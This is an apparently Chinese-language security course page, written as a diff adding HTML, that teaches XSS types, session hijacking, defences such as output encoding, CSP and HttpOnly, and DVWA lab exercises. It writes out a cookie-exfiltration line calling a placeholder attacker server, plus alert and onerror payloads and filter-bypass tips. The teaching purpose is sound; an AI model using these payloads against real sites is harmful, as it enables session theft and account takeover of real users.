@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>模块七第 3 章：XSS 跨站脚本 · 网络安全手记</title>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<div class="wrap">
+  <header class="site">
+    <div class="name"><a href="../index.html">网络安全手记</a></div>
+    <div class="desc">记录一个初学者成为网络安全工程师的日常。</div>
+    <nav>
+      <a href="../index.html">首页</a>
+      <a href="../course.html">课程</a>
+      <a href="../about.html">关于</a>
+    </nav>
+  </header>
+
+  <main>
+    <article>
+      <h1>模块七第 3 章：XSS 跨站脚本</h1>
+      <div class="meta"><span class="tag">Web 安全与渗透测试</span>2026-11-25 · 模块七</div>
+      <p>上一章的 SQL 注入攻击的是服务器：让数据库执行了不该执行的语句。这一章的 XSS（跨站脚本，Cross-Site Scripting）反过来，攻击的是浏览器：让受害者的浏览器执行攻击者的 JavaScript。SQL 注入偷的是数据库里的数据，XSS 偷的是浏览器里的东西——会话 Cookie、页面内容、用户正在做的操作。记住上一章那句关键的话：浏览器拿到 HTML 之后会执行里面的 JavaScript。XSS 就是想办法把自己的脚本“塞”进别人要看的页面里。</p>
+      <p>一个最简单的例子：某个网站有个留言板，你留言的内容会原样显示给所有访客。如果你留的不是文字，而是一段 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，网站又不做任何处理就把它显示出来，那么每个打开留言板的人，浏览器都会执行这段脚本。弹窗只是演示，换成偷 Cookie 的代码，事情就严重了：<code>new Image().src = 'http://攻击者服务器/?c=' + document.cookie</code>——浏览器会带着受害者的 Cookie 去“加载一张图片”，Cookie 就这样被送到了攻击者手里。</p>
+
+      <h2>三种 XSS，各藏在什么地方</h2>
+      <p><strong>第一，存储型 XSS（Stored）。</strong>恶意脚本被存进了数据库（留言、评论、用户名、个人简介），之后每个看这条内容的人都会中招。危害最大：攻击者发一次，所有访客都受影响；管理员一打开后台看留言，自己也中招——这叫“打到管理员”，是存储型 XSS 最常见的利用场景。</p>
+      <p><strong>第二，反射型 XSS（Reflected）。</strong>脚本不存下来，只藏在一次请求里：比如搜索框把你搜的词原样显示在页面上（“你搜索了：XXX”），攻击者把恶意脚本拼进搜索链接发给受害者，受害者一点链接，脚本就在他的浏览器里执行了。反射型需要受害者点击链接，所以常和钓鱼（<a href="m6c4-phishing-deep.html">模块六第 4 章</a>）配合使用。</p>
+      <p><strong>第三，DOM 型 XSS（DOM-based）。</strong>脚本既不经过服务器存储、也不经过服务器反射，而是前端 JavaScript 自己把 URL 里的数据拼进页面时出了问题。例如页面用 <code>document.write(location.hash)</code> 把地址栏 <code>#</code> 后面的内容写进页面，攻击者构造一个带恶意代码的链接就能触发。DOM 型最容易被漏测，因为服务器日志里根本看不到它——问题出在前端代码里。</p>
+      <p>三种类型可以用一个问题区分：脚本在谁手里“过了一遍”？存进数据库是存储型，只反射一次是反射型，前端 JavaScript 自己拼出来的是 DOM 型。实际测试时，三种都要测：输入框、URL 参数、Cookie 值、HTTP 头，任何一个能“原样回显到页面上”的地方，都是 XSS 的候选点。</p>
+
+      <h2>偷到 Cookie 之后能干什么</h2>
+      <p>上一章讲过，会话 ID 就是一把临时钥匙。XSS 偷到 Cookie，等于偷到了这把钥匙：攻击者把偷来的会话 ID 填进自己的浏览器，就能以受害者的身份登录，改密码、看私信、下订单——这叫<strong>会话劫持</strong>。更进一步，脚本还能在受害者浏览器里直接替他操作：发帖、改设置、转账，页面上的一切操作，脚本都能代劳。受害者甚至感觉不到异常，因为操作确实是在他自己的浏览器里、带着他的身份发出的。</p>
+      <p>所以防御的第一道关是 <code>HttpOnly</code>：给会话 Cookie 加上这个属性，JavaScript 就读不到它，偷 Cookie 的脚本就失效了。但这只是“减少伤害”，不是根治——脚本虽然偷不到 Cookie，仍然可以在页面里替用户操作。所以根治要靠下面讲的输出编码。</p>
+
+      <h2>怎么防：输出编码 + CSP</h2>
+      <p><strong>第一，输出编码（Output Encoding）。</strong>用户输入要显示在页面上时，先把有特殊含义的字符转义：<code>&lt;</code> 变成 <code>&amp;lt;</code>，<code>&gt;</code> 变成 <code>&amp;gt;</code>，引号变成对应的实体。这样一来，<code>&lt;script&gt;</code> 在页面上只会显示成一行文字，浏览器不会把它当成代码执行。关键原则是：编码要按“输出的上下文”来做——写进 HTML 正文、写进属性值、写进 JavaScript 字符串，编码方式各不相同；用成熟框架自带的转义功能，别自己手写过滤函数。</p>
+      <p><strong>第二，内容安全策略（CSP，Content Security Policy）。</strong>服务器通过响应头告诉浏览器：“这个页面只允许加载我自己域名下的脚本，其他来源的脚本一律不许执行。”就算攻击者塞进了脚本，CSP 也能拦住它执行。CSP 是纵深防御里非常强的一层，第 7 章还会讲到它。配置时从严格的策略开始，再按需放宽——一上来就放得很宽的 CSP 等于没配。</p>
+      <p><strong>第三，输入校验 + HttpOnly Cookie。</strong>输入做白名单校验（该填数字的只允许数字）；会话 Cookie 一定要加 HttpOnly 和 Secure（第 1 章讲过）。三层加起来：编码让脚本进不来，CSP 让进来的脚本跑不起来，HttpOnly 让跑起来的脚本偷不到钥匙。</p>
+
+      <figure class="diagram">
+        <svg viewBox="0 0 560 340" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="存储型XSS攻击流程图：攻击者提交恶意脚本，存入数据库，受害者浏览时脚本在其浏览器执行并外发Cookie">
+          <rect x="20" y="30" width="150" height="52" rx="8" fill="#fee2e2" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="95" y="52" text-anchor="middle" font-size="13" fill="#1a1a2e">攻击者</text>
+          <text x="95" y="70" text-anchor="middle" font-size="11" fill="#666">提交恶意脚本留言</text>
+          <rect x="390" y="30" width="150" height="52" rx="8" fill="#fef3c7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="465" y="52" text-anchor="middle" font-size="13" fill="#1a1a2e">网站服务器</text>
+          <text x="465" y="70" text-anchor="middle" font-size="11" fill="#666">不经处理存入数据库</text>
+          <rect x="20" y="140" width="150" height="52" rx="8" fill="#eff6ff" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="95" y="162" text-anchor="middle" font-size="13" fill="#1a1a2e">受害者</text>
+          <text x="95" y="180" text-anchor="middle" font-size="11" fill="#666">打开留言板页面</text>
+          <rect x="390" y="140" width="150" height="52" rx="8" fill="#dcfce7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="465" y="162" text-anchor="middle" font-size="13" fill="#1a1a2e">受害者浏览器</text>
+          <text x="465" y="180" text-anchor="middle" font-size="11" fill="#666">执行脚本，外发 Cookie</text>
+          <line x1="170" y1="56" x2="390" y2="56" stroke="#1a1a2e" stroke-width="1.5" marker-end="url(#b)"/>
+          <text x="280" y="46" text-anchor="middle" font-size="11" fill="#666">1. 存入</text>
+          <line x1="465" y1="82" x2="465" y2="140" stroke="#1a1a2e" stroke-width="1.5" marker-end="url(#b)"/>
+          <text x="480" y="115" text-anchor="middle" font-size="11" fill="#666">2. 取出显示</text>
+          <line x1="390" y1="166" x2="170" y2="166" stroke="#1a1a2e" stroke-width="1.5" marker-end="url(#b)"/>
+          <text x="280" y="156" text-anchor="middle" font-size="11" fill="#666">3. 脚本随页面返回</text>
+          <line x1="170" y1="140" x2="170" y2="82" stroke="#1a1a2e" stroke-width="1.5" stroke-dasharray="5,4" marker-end="url(#b)"/>
+          <text x="150" y="115" text-anchor="middle" font-size="11" fill="#666">4. Cookie 被偷走</text>
+          <rect x="130" y="230" width="300" height="60" rx="8" fill="#dcfce7" stroke="#1a1a2e" stroke-width="1.5"/>
+          <text x="280" y="254" text-anchor="middle" font-size="13" fill="#1a1a2e">防御：输出编码 + CSP + HttpOnly</text>
+          <text x="280" y="276" text-anchor="middle" font-size="11" fill="#666">脚本进不来、跑不起来、偷不到钥匙</text>
+          <defs><marker id="b" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="#1a1a2e"/></marker></defs>
+        </svg>
+        <figcaption>图：存储型 XSS 的完整链条——脚本存入数据库，随页面在受害者浏览器里执行</figcaption>
+      </figure>
+
+      <div class="teacher-note"><strong>老师经验：</strong>测 XSS 时，新手常犯两个错。第一，只试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，试一次没弹窗就说“没有 XSS”。其实很多页面过滤了 <code>script</code> 这个词，却没过滤事件属性——<code>&lt;img src=x onerror=alert(1)&gt;</code> 照样能执行；或者过滤了小写，换成大写 <code>&lt;ScRiPt&gt;</code> 就绕过去了。测试要换着花样试：标签、事件属性、伪协议、编码，轮着来。第二，测到了弹窗就以为完事了。弹窗只是证明“能执行代码”，报告里要写的是“能造成什么后果”：能不能偷到会话 Cookie（看有没有 HttpOnly）、能不能替用户操作、有没有打到管理员。按<a href="m6c11-risk-management.html">第 11 章</a>的影响 × 可能性定级时，“存储型 + 能偷管理员会话”就是高危，“反射型 + 需要用户点击 + 有 HttpOnly”就可以往下调一级。</div>
+
+      <h2>动手做</h2>
+      <p>1. 只在自己的虚拟机里：打开 DVWA 的 XSS（Stored）模块，先留一条正常留言，再留一条 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，刷新页面看弹窗出现；然后换个账号登录再看一次，确认“存下来”的脚本对每个访客都生效。<br>2. 试反射型：在 DVWA 的 XSS（Reflected）模块里，把 payload 拼进搜索参数，观察页面回显；再试 <code>&lt;img src=x onerror=alert(1)&gt;</code>，看过滤了 script 标签的页面能不能用事件属性绕过。<br>3. 验证 HttpOnly 的作用：把 DVWA 安全级别调到 High，重复第 1 步，观察脚本还能不能读到 Cookie（用 <code>alert(document.cookie)</code> 对比两次结果）。<br>4. 写修复建议：针对你测到的 XSS 写三条修复措施——输出编码怎么做、会话 Cookie 加什么属性、CSP 头怎么写，并说明每条措施防住了链条里的哪一环。</p>
+      <h2>避坑</h2>
+      <p>只在自己的靶场里测 XSS：往真实网站的留言板、评论区提交脚本是越界行为；别只试一种 payload：script 标签被拦不等于没有 XSS，事件属性、大小写、编码都要试；别以为弹窗就是终点：报告要写清后果（偷会话、替用户操作、打到管理员），按影响 × 可能性定级；别自己手写黑名单过滤：攻击者总能找到你没想到的写法，用框架自带的输出编码；别忘了 DOM 型：服务器日志里看不到它，要审前端 JavaScript 代码才找得到。</p>
+      <p>XSS 讲完，攻击的舞台已经从服务器扩展到了浏览器。下一章我们讲两种“借刀杀人”的手法：<a href="m7c4-csrf-ssrf.html">第 4 章：CSRF 与 SSRF</a>——前者借受害者的浏览器去干坏事，后者借服务器自己去干坏事。顺带一提，2025 版 OWASP 已经把 SSRF 并入了 A01，下一章我们会讲清这个映射关系。</p>
+      <div class="summary-box"><strong>本课小结</strong>
+        <ul>
+          <li>XSS 是让受害者的浏览器执行攻击者的 JavaScript；SQL 注入打服务器，XSS 打浏览器。</li>
+          <li>三种类型：存储型（存进数据库，人人中招）、反射型（藏在链接里，需点击）、DOM 型（前端 JS 自己拼出来的问题）。</li>
+          <li>最严重的后果是会话劫持：偷到 Cookie 就等于偷到登录身份，还能替用户在页面里操作。</li>
+          <li>防御三层：输出编码（按上下文转义）、CSP（只允许可信来源的脚本）、HttpOnly + Secure 的会话 Cookie。</li>
+          <li>测试只在自己的靶场里做；定级看类型、看能不能偷到会话、看能不能打到管理员。</li>
+        </ul>
+      </div>
+      <div class="lesson-nav">
+        <a href="m7c2-sqli-lab.html">← 上一章：第 2 章：SQL 注入实战</a>
+        <a href="../course.html">课程目录</a>
+        <a href="m7c4-csrf-ssrf.html">下一章：第 4 章：CSRF 与 SSRF →</a>
+      </div>
+    </article>
+  </main>
+
+  <footer class="site">网络安全手记 · 2026</footer>
+</div>
+</body>
+</html>
